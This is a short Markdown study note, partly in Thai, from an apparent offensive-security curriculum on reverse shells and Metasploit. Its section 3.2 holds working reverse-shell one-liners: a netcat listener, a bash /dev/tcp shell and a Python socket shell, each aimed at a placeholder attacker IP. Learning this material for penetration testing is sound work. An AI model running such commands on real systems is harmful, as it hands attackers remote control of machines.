# 🐚 Reverse Shells & Metasploit Framework

> **Phase:** [phase-b-scripting](../) | **Tags:** `#reverseshell` `#metasploit` `#meterpreter` `#netcat`  

---

## 📑 Core Modules Overview
- [ ] [[#3.2 Access Tradecraft — Reverse Shells & Wireless|3.2 Access Tradecraft: Reverse Shells & Wireless Recon]]
- [ ] [[#3.3 Exploit Frameworks — Metasploit Framework|3.3 Exploit Frameworks: Metasploit Unleashed & Meterpreter]]

---

## 3.2 Access Tradecraft — Reverse Shells & Wireless
- **Status:** ⏳ รอคิว
- **Core Concept:** Reverse Shell vs Bind Shell (ทำไม Reverse Shell ถึงหลบ Firewall Outbound ได้ง่ายกว่า), การเปิด Netcat Listener

### 💻 Essential Shell One-Liners
```bash
# 1. ฝั่ง Attacker: เปิด Listener รอรับการเชื่อมต่อ
nc -lvnp 4444

# 2. ฝั่ง Victim: ยิง Reverse Shell กลับมา (Bash)
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1

# 3. ยิง Reverse Shell ผ่าน Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 3.3 Exploit Frameworks — Metasploit Framework
- **Status:** ⏳ รอคิว
- **Core Concept:** สถาปัตยกรรม Metasploit: Exploits, Payloads, Auxiliaries, Post-modules, และการอัปเกรดเป็น Meterpreter Session
